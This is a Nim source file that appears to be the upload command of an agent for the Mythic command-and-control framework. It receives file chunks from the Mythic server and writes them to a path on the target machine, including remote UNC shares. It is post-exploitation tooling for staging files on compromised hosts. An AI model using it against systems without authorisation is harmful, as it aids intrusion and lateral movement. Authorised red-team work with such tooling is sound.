import json, os, base64, strutils

const CHUNK_SIZE = 512000  # 512KB chunks

type
  UploadArgs = object
    file: string
    remote_path: string
    file_name: string
    host: string  # Optional host for UNC paths

proc executeUpload*(taskId: string, params: JsonNode): JsonNode =
  ## Upload a file from Mythic to the target system
  ## This is a background task that requests chunks from Mythic
  
  try:
    let args = to(params, UploadArgs)
    
    # Build UNC path if host is provided
    var filePath: string
    if args.host.len > 0:
      # Remove leading/trailing backslashes from path
      var cleanPath = args.remote_path.strip(chars = {'\\', '/'})
      # Build UNC path: \\host\share
      filePath = "\\\\" & args.host & "\\" & cleanPath
    elif args.remote_path.startsWith("\\\\") or isAbsolute(args.remote_path):
      # Already UNC or absolute path
      filePath = args.remote_path
    else:
      # Relative path - join with current directory
      filePath = getCurrentDir() / args.remote_path
    
    # Check if file already exists
    if fileExists(filePath):
      return %*{
        "task_id": taskId,
        "completed": true,
        "status": "error",
        "user_output": "Remote path already exists: " & filePath
      }
    
    # Request first chunk
    return %*{
      "upload": {
        "chunk_size": CHUNK_SIZE,
        "file_id": args.file,
        "chunk_num": 1,
        "full_path": filePath
      },
      "task_id": taskId,
      "user_output": "Uploading chunk 1\n"
    }
    
  except Exception as e:
    return %*{
      "task_id": taskId,
      "completed": true,
      "status": "error",
      "user_output": "Error initiating upload: " & e.msg
    }

proc processUploadChunk*(taskId: string, fileId: string, path: string, chunkNum: int, chunkData: string, totalChunks: int, isFirstChunk: bool): JsonNode =
  ## Process a chunk received from Mythic
  ## Appends to file and requests next chunk if needed
  
  try:
    # Handle UNC paths and absolute paths - don't join with cwd
    let filePath = if path.startsWith("\\\\") or isAbsolute(path):
      path
    else:
      getCurrentDir() / path
    
    # Decode the chunk
    let decodedData = decode(chunkData)
    
    # Write to file (append mode for subsequent chunks)
    var file: File
    if isFirstChunk:
      file = open(filePath, fmWrite)
    else:
      file = open(filePath, fmAppend)
    defer: file.close()
    
    file.write(decodedData)
    
    # If more chunks remain, request the next one
    if chunkNum < totalChunks:
      let nextChunk = chunkNum + 1
      return %*{
        "upload": {
          "chunk_size": CHUNK_SIZE,
          "file_id": fileId,
          "chunk_num": nextChunk,
          "full_path": filePath
        },
        "task_id": taskId,
        "user_output": "Uploading chunk " & $nextChunk & "/" & $totalChunks & "\n"
      }
    else:
      # All chunks received, complete the task
      return %*{
        "task_id": taskId,
        "completed": true,
        "status": "success",
        "user_output": "Uploaded '" & filePath & "'"
      }
    
  except Exception as e:
    return %*{
      "task_id": taskId,
      "completed": true,
      "status": "error",
      "user_output": "Error processing upload chunk " & $chunkNum & ": " & e.msg
    }
